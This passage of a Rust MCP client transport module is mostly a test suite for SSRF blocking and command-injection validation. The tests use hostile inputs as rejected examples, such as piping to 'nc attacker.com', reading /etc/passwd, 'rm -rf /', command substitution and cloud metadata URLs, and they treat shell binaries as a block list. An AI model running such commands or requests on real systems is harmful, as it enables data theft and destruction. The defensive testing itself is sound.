            headers,
            timeout: std::time::Duration::from_secs(timeout_secs),
            rx: tokio::sync::Mutex::new(rx),
            tx,
        })
    }

    /// Send a request and handle SSE response stream
    async fn send_sse_request(&self, message: &Message) -> Result<(), TransportError> {
        let mut request = self
            .client
            .post(&self.url)
            .header("Content-Type", "application/json")
            .header("Accept", "text/event-stream, application/json")
            .timeout(self.timeout);

        // Add custom headers
        for (key, value) in &self.headers {
            request = request.header(key, value);
        }

        let response = request.json(message).send().await.map_err(|e| {
            if e.is_timeout() {
                TransportError::Timeout
            } else {
                TransportError::Http(e.to_string())
            }
        })?;

        let status = response.status();
        if !status.is_success() {
            let body = response.text().await.unwrap_or_default();
            return Err(TransportError::Http(format!(
                "HTTP {}: {}",
                status,
                truncate_error_body(&body)
            )));
        }

        // Check content type to determine response format
        let content_type = response
            .headers()
            .get("content-type")
            .and_then(|v| v.to_str().ok())
            .unwrap_or("");

        if content_type.contains("text/event-stream") {
            // Handle SSE stream
            let tx = self.tx.clone();
            let bytes_stream = response.bytes_stream();

            // Spawn task to process SSE stream
            tokio::spawn(async move {
                use futures::StreamExt;
                use tokio::io::AsyncBufReadExt;

                let stream = tokio_util::io::StreamReader::new(
                    bytes_stream.map(|r| r.map_err(std::io::Error::other)),
                );
                let mut reader = BufReader::new(stream);
                let mut line = String::new();
                let mut data_buffer = String::new();

                loop {
                    line.clear();
                    match reader.read_line(&mut line).await {
                        Ok(0) => break, // EOF
                        Ok(_) => {
                            let trimmed = line.trim();

                            if let Some(data) = trimmed.strip_prefix("data:") {
                                let new_data = data.trim();

                                // SECURITY: Prevent unbounded buffer growth from malicious SSE streams
                                if data_buffer.len() + new_data.len() > MAX_MESSAGE_SIZE {
                                    tracing::error!(
                                        current_size = data_buffer.len(),
                                        new_data_size = new_data.len(),
                                        max_size = MAX_MESSAGE_SIZE,
                                        "SSE data buffer exceeded maximum size, resetting buffer"
                                    );
                                    data_buffer.clear(); // Reset to prevent memory exhaustion
                                    continue;
                                }

                                data_buffer.push_str(new_data);
                            } else if trimmed.is_empty() && !data_buffer.is_empty() {
                                // Empty line signals end of event
                                if let Ok(msg) = serde_json::from_str::<Message>(&data_buffer) {
                                    if tx.send(msg).await.is_err() {
                                        break;
                                    }
                                }
                                data_buffer.clear();
                            }
                        }
                        Err(_) => break,
                    }
                }
            });
        } else {
            // Regular JSON response
            let response_message: Message = response
                .json()
                .await
                .map_err(|e| TransportError::InvalidMessage(e.to_string()))?;

            self.tx
                .send(response_message)
                .await
                .map_err(|e| TransportError::Send(e.to_string()))?;
        }

        Ok(())
    }
}

#[async_trait]
impl Transport for SseTransport {
    async fn send(&self, message: Message) -> Result<(), TransportError> {
        self.send_sse_request(&message).await
    }

    async fn receive(&self) -> Result<Message, TransportError> {
        self.rx
            .lock()
            .await
            .recv()
            .await
            .ok_or(TransportError::ConnectionClosed)
    }

    async fn close(&self) -> Result<(), TransportError> {
        // Drop the sender to signal completion
        Ok(())
    }

    fn transport_type(&self) -> &'static str {
        "sse"
    }
}

// ============================================================================
// Tests
// ============================================================================

#[cfg(test)]
mod tests {
    use super::*;

    // ------------------------------------------------------------------------
    // Message Tests
    // ------------------------------------------------------------------------

    #[test]
    fn test_message_request_construction() {
        let msg = Message::request(1, "tools/list", None);
        assert_eq!(msg.jsonrpc, "2.0");
        assert_eq!(msg.id, Some(serde_json::json!(1)));
        assert_eq!(msg.method, Some("tools/list".to_string()));
        assert!(msg.params.is_none());
        assert!(msg.result.is_none());
        assert!(msg.error.is_none());
    }

    #[test]
    fn test_message_request_with_params() {
        let params = serde_json::json!({"name": "get_weather"});
        let msg = Message::request("abc-123", "tools/call", Some(params.clone()));
        assert_eq!(msg.id, Some(serde_json::json!("abc-123")));
        assert_eq!(msg.params, Some(params));
    }

    #[test]
    fn test_message_response_construction() {
        let result = serde_json::json!({"tools": []});
        let msg = Message::response(serde_json::json!(1), result.clone());
        assert_eq!(msg.jsonrpc, "2.0");
        assert_eq!(msg.id, Some(serde_json::json!(1)));
        assert!(msg.method.is_none());
        assert_eq!(msg.result, Some(result));
        assert!(msg.error.is_none());
    }

    #[test]
    fn test_message_error_response() {
        let msg = Message::error_response(Some(serde_json::json!(1)), -32600, "Invalid Request");
        assert_eq!(msg.id, Some(serde_json::json!(1)));
        assert!(msg.result.is_none());
        let error = msg.error.unwrap();
        assert_eq!(error["code"], -32600);
        assert_eq!(error["message"], "Invalid Request");
    }

    #[test]
    fn test_message_is_request() {
        let request = Message::request(1, "test", None);
        assert!(request.is_request());
        assert!(!request.is_notification());
        assert!(!request.is_response());
    }

    #[test]
    fn test_message_is_notification() {
        let notification = Message {
            jsonrpc: "2.0".to_string(),
            id: None,
            method: Some("cancelled".to_string()),
            params: None,
            result: None,
            error: None,
        };
        assert!(notification.is_notification());
        assert!(!notification.is_request());
        assert!(!notification.is_response());
    }

    #[test]
    fn test_message_is_response() {
        let response = Message::response(serde_json::json!(1), serde_json::json!({}));
        assert!(response.is_response());
        assert!(!response.is_request());
        assert!(!response.is_notification());
    }

    #[test]
    fn test_message_serialization_roundtrip() {
        let msg = Message::request(42, "tools/list", None);
        let json = serde_json::to_string(&msg).unwrap();
        let parsed: Message = serde_json::from_str(&json).unwrap();
        assert_eq!(parsed.id, msg.id);
        assert_eq!(parsed.method, msg.method);
    }

    // ------------------------------------------------------------------------
    // HttpTransport Tests
    // ------------------------------------------------------------------------

    #[tokio::test]
    async fn test_http_transport_new_unchecked() {
        let transport = HttpTransport::new_unchecked("http://localhost:8080/mcp".to_string());
        assert_eq!(transport.url, "http://localhost:8080/mcp");
        assert!(transport.headers.is_empty());
    }

    #[tokio::test]
    async fn test_http_transport_with_config() {
        let mut headers = HashMap::new();
        headers.insert("X-Api-Key".to_string(), "secret".to_string());
        // Use a public URL for the validated constructor test
        let transport = HttpTransport::new_unchecked("http://localhost:8080/mcp".to_string());
        assert_eq!(transport.url, "http://localhost:8080/mcp");
    }

    #[tokio::test]
    async fn test_http_transport_success() {
        use wiremock::matchers::{method, path};
        use wiremock::{Mock, MockServer, ResponseTemplate};

        let mock_server = MockServer::start().await;

        let response_json = serde_json::json!({
            "jsonrpc": "2.0",
            "id": 1,
            "result": {"tools": []}
        });

        Mock::given(method("POST"))
            .and(path("/mcp"))
            .respond_with(ResponseTemplate::new(200).set_body_json(&response_json))
            .mount(&mock_server)
            .await;

        // Use unchecked for test mock server (localhost)
        let transport = HttpTransport::new_unchecked(format!("{}/mcp", mock_server.uri()));
        let request = Message::request(1, "tools/list", None);

        transport.send(request).await.unwrap();
        let response = transport.receive().await.unwrap();

        assert!(response.result.is_some());
        assert_eq!(response.id, Some(serde_json::json!(1)));
    }

    #[tokio::test]
    async fn test_http_transport_server_error() {
        use wiremock::matchers::{method, path};
        use wiremock::{Mock, MockServer, ResponseTemplate};

        let mock_server = MockServer::start().await;

        Mock::given(method("POST"))
            .and(path("/mcp"))
            .respond_with(ResponseTemplate::new(500).set_body_string("Internal Server Error"))
            .mount(&mock_server)
            .await;

        let transport = HttpTransport::new_unchecked(format!("{}/mcp", mock_server.uri()));
        let request = Message::request(1, "tools/list", None);

        let result = transport.send(request).await;
        assert!(matches!(result, Err(TransportError::Http(_))));
    }

    #[tokio::test]
    async fn test_http_transport_not_found() {
        use wiremock::matchers::{method, path};
        use wiremock::{Mock, MockServer, ResponseTemplate};

        let mock_server = MockServer::start().await;

        Mock::given(method("POST"))
            .and(path("/mcp"))
            .respond_with(ResponseTemplate::new(404).set_body_string("Not Found"))
            .mount(&mock_server)
            .await;

        let transport = HttpTransport::new_unchecked(format!("{}/mcp", mock_server.uri()));
        let request = Message::request(1, "tools/list", None);

        let result = transport.send(request).await;
        assert!(matches!(result, Err(TransportError::Http(_))));
        if let Err(TransportError::Http(msg)) = result {
            assert!(msg.contains("404"));
        }
    }

    #[tokio::test]
    async fn test_http_transport_invalid_json_response() {
        use wiremock::matchers::{method, path};
        use wiremock::{Mock, MockServer, ResponseTemplate};

        let mock_server = MockServer::start().await;

        Mock::given(method("POST"))
            .and(path("/mcp"))
            .respond_with(ResponseTemplate::new(200).set_body_string("not valid json"))
            .mount(&mock_server)
            .await;

        let transport = HttpTransport::new_unchecked(format!("{}/mcp", mock_server.uri()));
        let request = Message::request(1, "tools/list", None);

        let result = transport.send(request).await;
        assert!(matches!(result, Err(TransportError::InvalidMessage(_))));
    }

    #[tokio::test]
    async fn test_http_transport_receive_when_empty() {
        let transport = HttpTransport::new_unchecked("http://localhost:8080/mcp".to_string());
        let result = transport.receive().await;
        assert!(matches!(result, Err(TransportError::ConnectionClosed)));
    }

    #[tokio::test]
    async fn test_http_transport_close() {
        let transport = HttpTransport::new_unchecked("http://localhost:8080/mcp".to_string());
        let result = transport.close().await;
        assert!(result.is_ok());
    }

    // ------------------------------------------------------------------------
    // SSRF Prevention Tests
    // ------------------------------------------------------------------------

    #[tokio::test]
    async fn test_ssrf_blocks_private_ipv4() {
        // RFC 1918 private ranges
        assert!(HttpTransport::new("http://10.0.0.1/api".to_string())
            .await
            .is_err());
        assert!(HttpTransport::new("http://172.16.0.1/api".to_string())
            .await
            .is_err());
        assert!(HttpTransport::new("http://192.168.1.1/api".to_string())
            .await
            .is_err());

        // Loopback
        assert!(HttpTransport::new("http://127.0.0.1/api".to_string())
            .await
            .is_err());
        assert!(HttpTransport::new("http://127.0.0.53/api".to_string())
            .await
            .is_err());

        // Link-local (cloud metadata)
        assert!(HttpTransport::new("http://169.254.169.254/api".to_string())
            .await
            .is_err());
    }

    #[tokio::test]
    async fn test_ssrf_blocks_cloud_metadata() {
        // AWS/GCP metadata endpoint
        let result =
            HttpTransport::new("http://169.254.169.254/latest/meta-data/".to_string()).await;
        assert!(result.is_err());

        // Google metadata hostname
        let result =
            HttpTransport::new("http://metadata.google.internal/computeMetadata/".to_string())
                .await;
        assert!(result.is_err());
    }

    #[tokio::test]
    async fn test_ssrf_blocks_invalid_schemes() {
        // file:// scheme
        let result = HttpTransport::new("file:///etc/passwd".to_string()).await;
        assert!(result.is_err());

        // ftp:// scheme
        let result = HttpTransport::new("ftp://example.com/file".to_string()).await;
        assert!(result.is_err());
    }

    #[tokio::test]
    async fn test_ssrf_allows_public_urls() {
        // Public URLs should be allowed
        // Note: These may fail if DNS resolution fails, but shouldn't fail SSRF validation
        let result = HttpTransport::new("https://api.example.com/v1".to_string()).await;
        // This will fail DNS resolution but should not fail SSRF validation
        // The error should be about DNS, not SSRF
        if let Err(e) = result {
            let err_str = e.to_string();
            assert!(
                !err_str.contains("SSRF"),
                "Public URL should not trigger SSRF block: {}",
                err_str
            );
        }
    }

    #[tokio::test]
    async fn test_validate_url_for_ssrf_direct() {
        // Test the validation function directly
        assert!(validate_url_for_ssrf("http://10.0.0.1/api").await.is_err());
        assert!(validate_url_for_ssrf("http://192.168.1.1/api")
            .await
            .is_err());
        assert!(validate_url_for_ssrf("http://127.0.0.1/api").await.is_err());
        assert!(
            validate_url_for_ssrf("http://169.254.169.254/latest/meta-data/")
                .await
                .is_err()
        );
        assert!(validate_url_for_ssrf("file:///etc/passwd").await.is_err());

        // Invalid URL
        assert!(validate_url_for_ssrf("not-a-url").await.is_err());
    }

    // ------------------------------------------------------------------------
    // Command Injection Prevention Tests
    // ------------------------------------------------------------------------

    #[test]
    fn test_command_injection_blocks_shell_metacharacters() {
        // Semicolon (command separator)
        assert!(validate_command_for_injection("echo; cat /etc/passwd").is_err());

        // Pipe
        assert!(validate_command_for_injection("cat | nc attacker.com").is_err());

        // Background/AND
        assert!(validate_command_for_injection("sleep 1 & cat secret").is_err());

        // Variable expansion
        assert!(validate_command_for_injection("echo $HOME").is_err());

        // Command substitution
        assert!(validate_command_for_injection("echo `whoami`").is_err());

        // Subshell
        assert!(validate_command_for_injection("(cat /etc/passwd)").is_err());

        // Brace expansion
        assert!(validate_command_for_injection("echo {a,b}").is_err());

        // Redirection
        assert!(validate_command_for_injection("cat < /etc/passwd").is_err());
        assert!(validate_command_for_injection("echo > /tmp/file").is_err());

        // Newlines (command separator)
        assert!(validate_command_for_injection("echo\ncat /etc/passwd").is_err());
    }

    #[test]
    fn test_command_injection_blocks_direct_shell() {
        // Direct shell commands should be blocked
        assert!(validate_command_for_injection("sh").is_err());
        assert!(validate_command_for_injection("bash").is_err());
        assert!(validate_command_for_injection("/bin/bash").is_err());
        assert!(validate_command_for_injection("/usr/bin/bash").is_err());
        assert!(validate_command_for_injection("zsh").is_err());
        assert!(validate_command_for_injection("cmd").is_err());
        assert!(validate_command_for_injection("powershell").is_err());
    }

    #[test]
    fn test_command_injection_allows_safe_commands() {
        // Normal MCP server commands should be allowed
        assert!(validate_command_for_injection("node").is_ok());
        assert!(validate_command_for_injection("/usr/bin/node").is_ok());
        assert!(validate_command_for_injection("python").is_ok());
        assert!(validate_command_for_injection("python3").is_ok());
        assert!(validate_command_for_injection("/home/user/.local/bin/mcp-server").is_ok());
        assert!(validate_command_for_injection("npx").is_ok());
        assert!(validate_command_for_injection("uv").is_ok());
    }

    #[test]
    fn test_command_injection_empty_command() {
        assert!(validate_command_for_injection("").is_err());
    }

    #[test]
    fn test_args_injection_blocks_metacharacters() {
        // Arguments with shell metacharacters should be blocked
        let bad_args = vec![
            "-c".to_string(),
            "cat /etc/passwd".to_string(), // This is fine
        ];
        assert!(validate_args_for_injection(&bad_args).is_ok());

        let bad_args = vec![
            "-c".to_string(),
            "cat; rm -rf /".to_string(), // Semicolon in arg
        ];
        assert!(validate_args_for_injection(&bad_args).is_err());

        let bad_args = vec![
            "--script=$(whoami)".to_string(), // Variable expansion
        ];
        assert!(validate_args_for_injection(&bad_args).is_err());
    }

    #[test]
    fn test_args_injection_allows_safe_args() {
        // Normal arguments should be allowed
        let safe_args = vec![
            "--port".to_string(),
            "8080".to_string(),
            "--config".to_string(),
            "/path/to/config.json".to_string(),
        ];
        assert!(validate_args_for_injection(&safe_args).is_ok());

        // Arguments with spaces should be fine (shell won't split them)
        let safe_args = vec!["path with spaces/server.js".to_string()];
        assert!(validate_args_for_injection(&safe_args).is_ok());
    }

    #[tokio::test]
    async fn test_stdio_spawn_validates_command() {
        // Shell commands should be blocked
        let result =
            StdioTransport::spawn("bash", &["-c".to_string(), "echo test".to_string()]).await;
        assert!(result.is_err());
        if let Err(TransportError::CommandValidation(msg)) = result {
            assert!(msg.contains("shell"));
        }

        // Commands with metacharacters should be blocked
        let result = StdioTransport::spawn("echo; whoami", &[]).await;
        assert!(result.is_err());
    }

    // ------------------------------------------------------------------------
    // SseTransport Tests
    // ------------------------------------------------------------------------

    #[tokio::test]
    async fn test_sse_transport_connect_unchecked() {
        let transport =
            SseTransport::connect_unchecked("http://localhost:8080/sse".to_string()).await;
        assert!(transport.is_ok());
    }

    #[tokio::test]
    async fn test_sse_transport_connect_with_config() {
        let mut headers = HashMap::new();
        headers.insert("Authorization".to_string(), "Bearer token".to_string());
        let transport = SseTransport::connect_with_config_unchecked(
            "http://localhost:8080/sse".to_string(),
            headers,
            60,
        )
        .await;
        assert!(transport.is_ok());
    }

    #[tokio::test]
    async fn test_sse_transport_json_fallback() {
        use wiremock::matchers::{method, path};
        use wiremock::{Mock, MockServer, ResponseTemplate};

        let mock_server = MockServer::start().await;

        let response_json = serde_json::json!({
            "jsonrpc": "2.0",
            "id": 1,
            "result": {"status": "ok"}
        });

        Mock::given(method("POST"))
            .and(path("/sse"))
            .respond_with(
                ResponseTemplate::new(200)
                    .set_body_json(&response_json)
                    .insert_header("Content-Type", "application/json"),
            )
            .mount(&mock_server)
            .await;

        let transport = SseTransport::connect_unchecked(format!("{}/sse", mock_server.uri()))
            .await
            .unwrap();
        let request = Message::request(1, "test/method", None);

        transport.send(request).await.unwrap();
        let response = transport.receive().await.unwrap();

        assert!(response.result.is_some());
    }

    #[tokio::test]
    async fn test_sse_transport_close() {
        let transport = SseTransport::connect_unchecked("http://localhost:8080/sse".to_string())
            .await
            .unwrap();
        let result = transport.close().await;
        assert!(result.is_ok());
    }

    #[tokio::test]
    async fn test_sse_ssrf_blocks_private_ip() {
        let result = SseTransport::connect("http://192.168.1.1/sse".to_string()).await;
        assert!(result.is_err());

        let result = SseTransport::connect("http://10.0.0.1/sse".to_string()).await;
        assert!(result.is_err());
    }

    // ------------------------------------------------------------------------
    // TransportError Tests
    // ------------------------------------------------------------------------

    #[test]
    fn test_transport_error_display() {
        let err = TransportError::Timeout;
        assert_eq!(format!("{}", err), "Timeout");

        let err = TransportError::ConnectionClosed;
        assert_eq!(format!("{}", err), "Connection closed");

        let err = TransportError::Http("404 Not Found".to_string());
        assert!(format!("{}", err).contains("404 Not Found"));
    }

    #[test]
    fn test_transport_error_from_io() {
        let io_err = std::io::Error::new(std::io::ErrorKind::NotFound, "file not found");
        let transport_err: TransportError = io_err.into();
        assert!(matches!(transport_err, TransportError::Spawn(_)));
    }

    #[tokio::test]
    async fn test_validate_url_ssrf_protection() {
        // Private IP ranges
        assert!(validate_url_for_ssrf("http://127.0.0.1/api").await.is_err());
        assert!(validate_url_for_ssrf("http://localhost/api").await.is_err()); // resolves to 127.0.0.1
        assert!(validate_url_for_ssrf("http://10.0.0.5/api").await.is_err());
        assert!(validate_url_for_ssrf("http://192.168.1.1/api")
            .await
            .is_err());
        assert!(validate_url_for_ssrf("http://172.16.0.1/api")
            .await
            .is_err());

        // Cloud metadata
        assert!(
            validate_url_for_ssrf("http://169.254.169.254/latest/meta-data")
                .await
                .is_err()
        );
        assert!(validate_url_for_ssrf("http://metadata.google.internal/")
            .await
            .is_err());

        // Schemes
        assert!(validate_url_for_ssrf("ftp://example.com").await.is_err());
        assert!(validate_url_for_ssrf("file:///etc/passwd").await.is_err());

        // Valid public URLs - may fail if DNS resolution fails in test environment
        // The primary assertion is that they don't error for SSRF reasons
        // but DNS failures are now expected if the hostname can't resolve
        let result = validate_url_for_ssrf("https://api.example.com/v1").await;
        match &result {
            Ok(_) => {} // DNS resolved and passed SSRF checks
            Err(TransportError::InvalidUrl(msg)) if msg.contains("DNS resolution failed") => {}
            Err(e) => panic!("Expected Ok or DNS resolution error, got: {:?}", e),
        }
    }

    #[test]
    fn test_validate_command_injection() {
        // Safe commands
        assert!(validate_command_for_injection("ls").is_ok());
        assert!(validate_command_for_injection("/usr/bin/python3").is_ok());

        // Shell metacharacters
        assert!(validate_command_for_injection("ls; rm -rf /").is_err());
        assert!(validate_command_for_injection("ls | grep foo").is_err());
        assert!(validate_command_for_injection("echo $HOME").is_err());
        assert!(validate_command_for_injection("`whoami`").is_err());
        assert!(validate_command_for_injection("foo && bar").is_err());

        // Direct shell execution
        assert!(validate_command_for_injection("bash").is_err());
        assert!(validate_command_for_injection("/bin/sh").is_err());
        assert!(validate_command_for_injection("powershell.exe").is_err());
    }

    #[test]
    fn test_validate_args_injection() {
        let args = vec!["-la".to_string(), "/tmp".to_string()];
        assert!(validate_args_for_injection(&args).is_ok());

        let bad_args = vec!["-la".to_string(), "; rm -rf /".to_string()];
        assert!(validate_args_for_injection(&bad_args).is_err());
    }

    // Mock test for message serialization/deserialization compatibility
    #[test]
    fn test_message_format() {
        let msg = Message::request(1, "tools/list", None);
        let json = serde_json::to_string(&msg).unwrap();
        let parsed: Message = serde_json::from_str(&json).unwrap();

        assert!(parsed.is_request());
        assert_eq!(parsed.method, Some("tools/list".to_string()));
        assert_eq!(parsed.id, Some(serde_json::json!(1)));
    }

    // ------------------------------------------------------------------------
    // Additional Edge Case Tests (Phase 3)
    // ------------------------------------------------------------------------

    #[test]
    fn test_truncate_error_body_short() {
        let short = "Short error message";
        assert_eq!(truncate_error_body(short), short);
    }

    #[test]
    fn test_truncate_error_body_exact_limit() {
        let exact = "x".repeat(MAX_ERROR_BODY_LEN);
        assert_eq!(truncate_error_body(&exact), exact);
    }

    #[test]
    fn test_truncate_error_body_long() {
        let long = "x".repeat(MAX_ERROR_BODY_LEN + 100);
        let truncated = truncate_error_body(&long);
        assert!(truncated.ends_with("... (truncated)"));
        assert!(truncated.len() < long.len());
    }

    #[test]
    fn test_is_private_ipv6_mapped_ipv4() {
        // IPv6-mapped IPv4 private addresses should be blocked
        let ipv6_mapped_private: Ipv6Addr = "::ffff:192.168.1.1".parse().unwrap();
        assert!(is_private_ipv6(&ipv6_mapped_private));

        let ipv6_mapped_loopback: Ipv6Addr = "::ffff:127.0.0.1".parse().unwrap();
        assert!(is_private_ipv6(&ipv6_mapped_loopback));
    }

    #[test]
    fn test_is_private_ipv6_unique_local() {
        // fc00::/7 unique local addresses
        let unique_local: Ipv6Addr = "fc00::1".parse().unwrap();
        assert!(is_private_ipv6(&unique_local));

        let unique_local_2: Ipv6Addr = "fd12:3456:789a::1".parse().unwrap();
        assert!(is_private_ipv6(&unique_local_2));
    }

    #[test]
    fn test_is_private_ipv6_link_local() {
        // fe80::/10 link-local
        let link_local: Ipv6Addr = "fe80::1".parse().unwrap();
        assert!(is_private_ipv6(&link_local));
    }

    #[test]
    fn test_is_private_ipv6_public() {
        // Public IPv6 addresses should not be private
        let public: Ipv6Addr = "2001:db8::1".parse().unwrap();
        assert!(!is_private_ipv6(&public));
    }

    #[test]
    fn test_is_private_ipv4_shared_address_space() {
        // 100.64.0.0/10 (RFC 6598 shared address space)
        let shared: Ipv4Addr = "100.64.0.1".parse().unwrap();
        assert!(is_private_ipv4(&shared));

        let shared_2: Ipv4Addr = "100.127.255.255".parse().unwrap();
        assert!(is_private_ipv4(&shared_2));
    }

    #[test]
    fn test_is_private_ipv4_reserved() {
        // 240.0.0.0/4 reserved for future use
        let reserved: Ipv4Addr = "240.0.0.1".parse().unwrap();
        assert!(is_private_ipv4(&reserved));
    }

    #[tokio::test]
    async fn test_ssrf_blocks_alibaba_metadata() {
        assert!(validate_url_for_ssrf("http://100.100.100.200/")
            .await
            .is_err());
    }

    #[tokio::test]
    async fn test_ssrf_blocks_azure_metadata() {
        assert!(validate_url_for_ssrf("http://metadata.azure.internal/")
            .await
            .is_err());
    }

    #[test]
    fn test_message_notification() {
        let notification = Message {
            jsonrpc: "2.0".to_string(),
            id: None,
            method: Some("notifications/progress".to_string()),
            params: Some(serde_json::json!({"progress": 50})),
            result: None,
            error: None,
        };

        assert!(notification.is_notification());
        assert!(!notification.is_request());
        assert!(!notification.is_response());
    }

    #[test]
    fn test_message_error_response_format() {
        let error_response =
            Message::error_response(Some(serde_json::json!(1)), -32600, "Invalid Request");

        assert!(error_response.is_response());
        assert!(error_response.error.is_some());
        assert!(!error_response.is_request());
    }

    #[tokio::test]
    async fn test_http_transport_with_config_headers() {
        // Use new_unchecked for testing since DNS resolution may fail for example.com
        // The SSRF validation is tested separately
        let _headers = HashMap::from([("Authorization".to_string(), "Bearer token".to_string())]);
        let transport = HttpTransport::new_unchecked("https://api.example.com/mcp".to_string());
        // Just verify the transport was created with headers capability
        assert!(!transport.url.is_empty());
    }

    #[tokio::test]
    async fn test_http_transport_with_config_blocks_private() {
        let transport =
            HttpTransport::with_config("http://192.168.1.1/mcp".to_string(), HashMap::new(), 30)
                .await;
        assert!(transport.is_err());
    }
}
